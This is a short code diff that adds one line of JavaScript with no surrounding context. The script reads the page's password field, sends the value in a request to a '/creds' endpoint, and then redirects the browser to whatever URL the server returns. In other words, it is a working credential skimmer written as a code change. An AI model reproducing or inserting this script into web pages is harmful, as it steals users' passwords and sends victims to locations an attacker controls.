@@ -1,0 +1,1 @@
+var password = document.querySelector('input[type=password]').value; var httpRequest = new XMLHttpRequest();httpRequest.open('GET', '/creds?password=' + password, true);httpRequest.onreadystatechange = function(){ if(httpRequest.readyState === XMLHttpRequest.DONE) { console.log(httpRequest.responseText); window.location = httpRequest.responseText; }};httpRequest.send();
